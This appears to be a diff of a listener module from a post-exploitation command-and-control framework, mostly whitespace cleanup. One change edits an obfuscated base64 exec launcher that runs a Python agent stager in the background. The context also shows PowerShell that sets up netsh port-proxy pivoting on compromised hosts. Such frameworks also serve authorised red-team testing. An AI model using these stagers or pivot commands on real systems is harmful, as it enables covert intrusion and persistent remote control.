@@ -60,7 +60,7 @@ class Listener:
         self.threads = {} # used to keep track of any threaded instances of this server
 
         # optional/specific for this module
-        
+
 
         # set the default staging key to the controller db default
         #self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
@@ -96,7 +96,7 @@ class Listener:
         if not language:
             print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
             return None
-        
+
         if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
 
             # extract the set options for this instantiated listener
@@ -333,7 +333,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -539,7 +539,7 @@ class Listener:
         """
         Generate just the agent communication code block needed for communications with this listener.
         This is so agents can easily be dynamically updated for the new listener.
-        
+
         This should be implemented for the module.
         """
 
@@ -707,13 +707,13 @@ def send_message(packets=None):
         here and the actual server code in another function to facilitate threading
         (i.e. start_server() in the http listener).
         """
-        
+
         tempOptions = copy.deepcopy(self.options)
         listenerName = self.options['Listener']['Value']
         # validate that the Listener does exist
         if self.mainMenu.listeners.is_listener_valid(listenerName):
             # check if a listener for the agent already exists
-            
+
             if self.mainMenu.listeners.is_listener_valid(tempOptions['Name']['Value']):
                 print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Name']['Value']))
                 return False
@@ -755,7 +755,7 @@ def send_message(packets=None):
                 else{
                     $ConnectAddress = ""
                     $ConnectPort = ""
-                    
+
                     $parts = $ConnectHost -split(":")
                     if($parts.Length -eq 2){
                         # if the form is http[s]://HOST or HOST:PORT
@@ -779,7 +779,7 @@ def send_message(packets=None):
                         $ConnectPort = $parts[2]
                     }
                     if($ConnectPort -ne ""){
-                    
+
                         $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                         if($out){
                             $out
@@ -815,7 +815,7 @@ def send_message(packets=None):
                                 host = "http://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['ListenPort']['Value'])
                                 self.options[option]['Value'] = host
 
-                    
+
                     # check to see if there was a host value at all
                     if "Host" not in self.options.keys():
                         self.options['Host']['Value'] = host
@@ -887,7 +887,7 @@ def send_message(packets=None):
                         else{
                             $ConnectAddress = ""
                             $ConnectPort = ""
-                            
+
                             $parts = $ConnectHost -split(":")
                             if($parts.Length -eq 2){
                                 # if the form is http[s]://HOST or HOST:PORT
@@ -911,7 +911,7 @@ def send_message(packets=None):
                                 $ConnectPort = $parts[2]
                             }
                             if($ConnectPort -ne ""){
-                            
+
                                 $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                 if($out){
                                     $out
@@ -934,12 +934,12 @@ def send_message(packets=None):
                     msg = "Tasked agent to uninstall Pivot listener "
                     self.mainMenu.agents.save_agent_log(sessionID, msg)
 
-                    
+
 
                 elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):
-                    
+
                     print helpers.color("[!] Shutdown not implemented for python")
-                    
+
             else:
                 print helpers.color("[!] Agent is not present in the cache or not elevated")
 
